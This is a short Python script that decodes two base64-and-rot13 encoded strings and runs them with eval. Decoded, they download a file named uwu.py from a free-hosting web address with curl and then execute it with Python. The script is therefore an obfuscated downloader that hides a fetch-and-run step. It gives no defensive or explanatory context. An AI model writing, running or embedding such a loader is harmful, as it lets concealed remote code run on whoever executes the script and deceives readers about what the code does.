import codecs
import base64
import os

first = '''
YmYuZmxmZ3J6KCJwaGV5IC1CIHVnZ2NmOi8vYW5odHVnLW9iYnhmLjAwMGpyb3ViZmduY2MucGJ6L2hqaC5jbCIpCg==
'''

second = '''
YmYuZmxmZ3J6KCJDbGd1YmEgaGpoLmNsIikK==
'''

first_byte = base64.b64decode(first)
first_string = first_byte.decode()
first_out = codecs.decode(first_string, 'rot13')
second_byte = base64.b64decode(second)
second_string = second_byte.decode()
second_out = codecs.decode(second_string, 'rot13')

eval(first_out)
eval(second_out)
